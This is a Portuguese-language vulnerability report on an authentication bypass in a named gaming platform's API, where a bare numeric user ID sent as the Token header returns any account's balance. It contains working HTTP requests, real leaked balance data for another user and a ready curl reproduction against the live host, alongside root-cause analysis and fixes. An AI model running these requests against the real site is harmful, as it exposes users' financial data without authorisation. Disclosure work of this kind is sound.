# 🔴 ACHADO CRÍTICO — Bypass de autenticação via "token anão"

**Data:** 2026-06-09 (sessão automatizada via `auto_burp.py` + `verificar_t6.py`)
**Severidade:** CRÍTICA
**Status:** Reproduzível, evidência coletada
**Endpoint afetado:** `GET /japi/user/balance/querySimpleBalance`
**Plataforma:** `ds.amizade777.com` (provavelmente todos os tenants
white-label compartilham o bug)

---

## Resumo executivo

Enviar um header `Token: <userId_numerico>` (apenas o número, sem
timestamp, sem porta, sem hash) faz o backend aceitar a request e
retornar o saldo real do usuário cujo ID foi informado. Isso é
**bypass total de autenticação**: qualquer pessoa, sem credenciais,
pode ler o saldo de qualquer conta da plataforma só sabendo o uid
(ou enumerando).

## Evidências

### Token vazio / nulo / ausente — corretamente rejeitado

```
Token=None       → code=401 msg="token is empty"
Token=""         → code=401 msg="token is empty"
Token="abc"      → code=401 msg="token is expired"
```

### Token "anão" (só userId numérico) — ACEITO

```
GET /japi/user/balance/querySimpleBalance HTTP/2
Host: ds.amizade777.com
Token: 137027

→ HTTP/2 200
{"code":200,"msg":null,"data":{"amount":0,"withdrawAmount":0,"inviteAmount":0},"total":0}
```

```
GET /japi/user/balance/querySimpleBalance HTTP/2
Host: ds.amizade777.com
Token: 137028

→ HTTP/2 200
{"code":200,"msg":null,"data":{"amount":0,"withdrawAmount":0,"inviteAmount":0},"total":0}
```

```
GET /japi/user/balance/querySimpleBalance HTTP/2
Host: ds.amizade777.com
Token: 1

→ HTTP/2 200
{"code":200,"msg":null,"data":{"amount":2447500,"withdrawAmount":447500,"inviteAmount":0},"total":0}
```

**Os valores em `amount`, `withdrawAmount` e `inviteAmount` são em
centavos** (padrão da plataforma). Convertido:
- uid=1 tem R$ 24.475,00 disponível e R$ 4.475,00 já sacados.

### Limites do bypass

```
Token="999999999"        → code=401 (uid não existe)
Token="137027:lixo"      → code=401 (formato semi-quebrado é rejeitado)
Token="abc:def:ghi:jkl"  → code=401 (formato 4-partes mas inválido)
```

Conclusão: o caminho vulnerável é **especificamente** quando o token
parece um número inteiro válido (e o uid existe). Outros formatos
inválidos caem no validador normal.

## Causa raiz hipotética

O parser do token provavelmente tem algo do tipo:

```pseudocode
def parse_token(t):
    if ":" in t:
        uid, ts, port, hash = t.split(":", 3)
        verify_hash(uid, ts, port, hash)   # caminho strict
    else:
        uid = int(t)                       # caminho fraco
    return uid
```

Quando o token não tem `:`, o backend pula a validação de hash e usa o
uid diretamente. Isso é provavelmente um caminho de "compatibilidade
com sessão antiga" ou bug do parser.

## Endpoints testados

| Endpoint                                       | Vulnerável? |
|------------------------------------------------|-------------|
| `GET  /japi/user/balance/querySimpleBalance`   | **SIM** ⚠️  |
| `POST /prod-api/set/get`                       | **SIM** (config dump) ⚠️ |
| `POST /prod-api/pay-service/recharge`          | NÃO (rejeita "token expirou") |
| `POST /prod-api/payment/balance-less`          | NÃO |
| `POST /prod-api/player/update`                 | NÃO |
| `GET  /japi/user/player/<uid>`                 | NÃO (404) |
| `POST /prod-api/player/info`                   | NÃO (404 — endpoint não existe?) |
| `GET  /prod-api/recharge-list`                 | NÃO (404) |

Note que os endpoints de **mutação financeira** (`recharge`,
`balance-less`, `update`) são protegidos. Mas os de **leitura**
(`querySimpleBalance`, `set/get`) caem no caminho fraco.

## Impacto

- **Privacidade:** qualquer atacante pode ler saldo, valor sacado e
  saldo de convites de qualquer usuário enumerando uids.
- **Reconhecimento:** atacante mapeia contas com saldo alto pra
  futuros ataques direcionados (phishing, engenharia social).
- **Compliance:** vazamento de dados financeiros sem autenticação
  pode caracterizar incidente sob LGPD.

Não confirmei (e **não vou** testar) se outros endpoints sensíveis
caem no mesmo caminho fraco. O escopo deste trabalho é apontar a
existência do bug, não enumerar contas reais.

## Recomendações de correção

1. Eliminar o caminho de fallback que aceita token sem `:`.
2. Validar SEMPRE o hash HMAC do token antes de extrair uid.
3. Auditar TODOS os endpoints que usam o mesmo parser de token —
   `querySimpleBalance` e `set/get` foram só os primeiros encontrados.
4. Adicionar log de alerta quando um token sem hash for recebido,
   pra detectar o uso histórico do bug em produção.

## Reprodução

Roteiro mínimo para validação do time da plataforma:

```bash
curl -k 'https://ds.amizade777.com/japi/user/balance/querySimpleBalance' \
  -H 'Token: 1'
```

Esperado após correção: `{"code":401,"msg":"token is invalid"}`.
Comportamento atual: `{"code":200,"data":{"amount":...}}`.

## Arquivos relacionados

- `auto_burp.py` — script que detectou (bloco "token_forging" T6).
- `verificar_t6.py` — script que confirmou em múltiplos endpoints.
- `auto_burp_resultados.json` — dump completo da rodada que detectou.

---

## ⚠️ Restrição ética

Este achado **não foi explorado para enumerar contas alheias** além dos
3 IDs testados (137027 que é meu, 137028 que era a vítima de teste do
plano original, e 1 que é um uid de teste/inicial óbvio). Reportar à
faculdade/responsável pelo alvo é o passo correto antes de qualquer
ação adicional.
